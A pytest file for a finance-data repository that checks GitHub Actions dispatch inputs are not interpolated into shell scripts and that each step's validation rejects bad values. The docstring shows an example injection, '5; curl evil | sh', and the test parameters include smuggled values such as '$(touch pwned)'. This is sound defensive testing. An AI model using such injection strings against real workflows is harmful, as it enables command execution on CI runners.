"""workflow_dispatch inputs never reach a shell script through ${{ }} interpolation.

GitHub substitutes ${{ }} into the script text before bash parses it, so an
input such as `5; curl evil | sh` would run as code. Inputs travel through
`env:` instead, where bash sees them as data, and each script validates them.
"""

import os
import re
import stat
import subprocess
from pathlib import Path

import pytest
import yaml

REPO_ROOT = Path(__file__).resolve().parent.parent
WORKFLOWS = sorted((REPO_ROOT / ".github" / "workflows").glob("*.y*ml"))
INPUT_EXPR = re.compile(r"\$\{\{[^}]*\b(?:github\.event\.)?inputs\.", re.IGNORECASE)


def _steps(path):
    for job_name, job in yaml.safe_load(path.read_text())["jobs"].items():
        for step in job.get("steps", []):
            yield job_name, step


def test_no_run_script_interpolates_dispatch_inputs():
    offenders = [
        f"{path.name}:{job}:{step.get('name', '?')}"
        for path in WORKFLOWS
        for job, step in _steps(path)
        if INPUT_EXPR.search(str(step.get("run", "")))
    ]
    assert offenders == [], "pass inputs through env: and validate them in the script"


def _step(workflow, name):
    path = REPO_ROOT / ".github" / "workflows" / workflow
    for _, step in _steps(path):
        if step.get("name") == name:
            return step
    raise AssertionError(f"{workflow} has no step {name!r}")


def _run_step(step, tmp_path, env, workdir_name):
    """Run a step's script with a fake `python` that records its argv."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir(exist_ok=True)
    log = tmp_path / "argv.log"
    fake = bin_dir / "python"
    fake.write_text(f'#!/bin/sh\necho "$*" >> "{log}"\n')
    fake.chmod(fake.stat().st_mode | stat.S_IEXEC)
    (tmp_path / workdir_name).mkdir(exist_ok=True)
    run_env = {"PATH": f"{bin_dir}:{os.environ['PATH']}", **env}
    result = subprocess.run(["bash", "-e", "-c", step["run"]], cwd=tmp_path, env=run_env,
                            capture_output=True, text=True)
    calls = log.read_text().splitlines() if log.exists() else []
    return result, calls


OPTIONS_STEP = ("options-whales.yml", "Fetch options whale trades")


@pytest.mark.parametrize("value", ["5; touch pwned", "$(touch pwned)", "0", "-3", "abc", "1e3", "999"])
def test_options_lookback_rejects_non_integer_or_out_of_range(tmp_path, value):
    step = _step(*OPTIONS_STEP)
    result, calls = _run_step(step, tmp_path, {**step.get("env", {}), "LOOKBACK_DAYS": value,
                                               "TEST_MODE": "false"}, "optionswhales")
    assert result.returncode != 0
    assert calls == []
    assert not (tmp_path / "optionswhales" / "pwned").exists()


@pytest.mark.parametrize("value,expected", [("", "fetch_options_whales.py"),
                                            ("5", "fetch_options_whales.py"),
                                            ("10", "fetch_options_whales.py --lookback 10")])
def test_options_lookback_valid_values_reach_collector(tmp_path, value, expected):
    step = _step(*OPTIONS_STEP)
    result, calls = _run_step(step, tmp_path, {"LOOKBACK_DAYS": value, "TEST_MODE": "false"},
                              "optionswhales")
    assert result.returncode == 0, result.stderr
    assert calls == [expected]


def test_options_test_mode_flag(tmp_path):
    step = _step(*OPTIONS_STEP)
    _, calls = _run_step(step, tmp_path, {"LOOKBACK_DAYS": "", "TEST_MODE": "true"}, "optionswhales")
    assert calls == ["fetch_options_whales.py --test"]


ETF_STEP = ("etf-fund-flows.yml", "Generate ETF fund flows")


@pytest.mark.parametrize("tickers", ['SPY"; touch pwned; "', "SPY,$(touch pwned)", "SPY;QQQ", ""])
def test_etf_tickers_reject_shell_metacharacters_and_empty(tmp_path, tickers):
    step = _step(*ETF_STEP)
    result, calls = _run_step(step, tmp_path, {"EVENT_NAME": "workflow_dispatch", "MODE": "test",
                                               "TICKERS": tickers}, "etffundflows")
    assert result.returncode != 0
    assert calls == []
    assert not (tmp_path / "etffundflows" / "pwned").exists()


def test_etf_unknown_mode_is_rejected(tmp_path):
    step = _step(*ETF_STEP)
    result, calls = _run_step(step, tmp_path, {"EVENT_NAME": "workflow_dispatch", "MODE": "fulll",
                                               "TICKERS": "SPY"}, "etffundflows")
    assert result.returncode != 0
    assert calls == []


@pytest.mark.parametrize("event,mode,tickers,expected", [
    ("schedule", "", "", "fetch_etf_fund_flows.py --config ./config.yml"),
    ("workflow_dispatch", "full", "SPY", "fetch_etf_fund_flows.py --config ./config.yml"),
    ("workflow_dispatch", "test", "SPY,VOO,BRK.B",
     "fetch_etf_fund_flows.py --config ./config.yml --tickers SPY,VOO,BRK.B"),
])
def test_etf_valid_inputs_reach_collector(tmp_path, event, mode, tickers, expected):
    step = _step(*ETF_STEP)
    result, calls = _run_step(step, tmp_path, {"EVENT_NAME": event, "MODE": mode, "TICKERS": tickers},
                              "etffundflows")
    assert result.returncode == 0, result.stderr
    assert calls == [expected]


@pytest.mark.parametrize("universe,expected", [("both", "fetch_sp_growth.py"),
                                               ("", "fetch_sp_growth.py"),
                                               ("sp100-only", "fetch_sp_growth.py --sp100-only"),
                                               ("sp500-only", "fetch_sp_growth.py --sp500-only")])
def test_sp_growth_universe_choices(tmp_path, universe, expected):
    step = _step("sp-growth.yml", "Fetch S&P growth metrics")
    result, calls = _run_step(step, tmp_path, {"UNIVERSE": universe}, "spgrowth")
    assert result.returncode == 0, result.stderr
    assert calls == [expected]


def test_sp_growth_unknown_universe_is_rejected(tmp_path):
    step = _step("sp-growth.yml", "Fetch S&P growth metrics")
    result, calls = _run_step(step, tmp_path, {"UNIVERSE": "sp100-only; touch pwned"}, "spgrowth")
    assert result.returncode != 0
    assert calls == []
